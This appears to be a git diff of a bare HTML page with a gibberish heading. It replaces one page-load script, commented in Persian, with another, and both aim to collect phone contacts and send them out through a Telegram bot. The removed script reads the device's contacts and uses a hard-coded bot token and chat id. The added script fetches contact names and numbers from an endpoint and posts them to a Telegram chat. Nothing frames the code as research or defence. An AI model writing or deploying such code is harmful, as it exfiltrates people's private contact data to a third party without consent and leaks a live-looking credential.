@@ -7,72 +7,42 @@
 </head>
 <body>
     <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
-    <h1>kslfkesofeskf</h1>
+
     <script>
-// اتصال به مخاطبین گوشی و ارسال پیام
-function accessContactsAndSendMessage() {
-// چک کردن اینکه دستگاه از دسترسی به مخاطبین پشتیبانی می‌کند یا خیر
-if ('contacts' in navigator) {
-// درخواست دسترسی به مخاطبین
-navigator.contacts.select(['name', 'phone']).then(contacts => {
-// یافتن شماره تلفن هر مخاطب و ارسال پیام
-contacts.forEach(contact => {
-// اگر شماره تلفنی برای مخاطب وجود داشته باشد
-if (contact.phoneNumbers.length > 0) {
-const phoneNumber = contact.phoneNumbers[0].value;
-sendMessage(phoneNumber, 'Your message here', '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw', '1209515299'); // تابعی برای ارسال پیام
-}
-});
-}).catch(error => {
-console.error('Error accessing contacts:', error);
-});
-} else {
-console.error('Contacts API not supported');
-}
-}
-
-// تابعی برای ارسال پیام
-function sendMessage(phoneNumber, message, botToken, botId) {
-// ارسال درخواست به API تلگرام با استفاده از توکن ربات
-const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-const data = {
-chat_id: botId,
-text: message
-};
-
-// ارسال درخواست POST با استفاده از Fetch API یا Axios یا هر کتابخانه دیگری
-// در این مثال از Fetch API استفاده شده است
-fetch(telegramApiUrl, {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify(data)
-})
+// درخواست به وب سایت شما برای گرفتن اطلاعات مخاطبین
+fetch("URL_OF_YOUR_WEBSITE_CONTACTS_ENDPOINT")
 .then(response => {
-console.log('Message sent:', response);
+if (!response.ok) {
+throw new Error("Network response was not ok");
+}
+return response.json(); // تبدیل پاسخ به فرمت JSON
+})
+.then(data => {
+// گرفتن اطلاعات مخاطبین از پاسخ
+var contacts = data.contacts;
+
+// ساختن پیام برای ارسال به تلگرام
+var message = "Contacts:\n";
+contacts.forEach(contact => {
+message += "Name: " + contact.name + ", Phone: " + contact.phone + "\n";
+});
+
+// فرستادن پیام به تلگرام
+var botId = "YOUR_BOT_ID"; // آیدی چت بات
+fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=" + botId + "&text=" + encodeURIComponent(message))
+.then(response => {
+if (!response.ok) {
+throw new Error("Network response was not ok");
+}
+console.log("Message sent successfully!");
 })
 .catch(error => {
-console.error('Error sending message:', error);
+console.error("There was a problem sending the message:", error);
 });
-}
-
-// فراخوانی تابع برای شروع عملیات
-accessContactsAndSendMessage();
+})
+.catch(error => {
+console.error("There was a problem getting the contacts:", error);
+});
     </script>
 </body>
 </html>
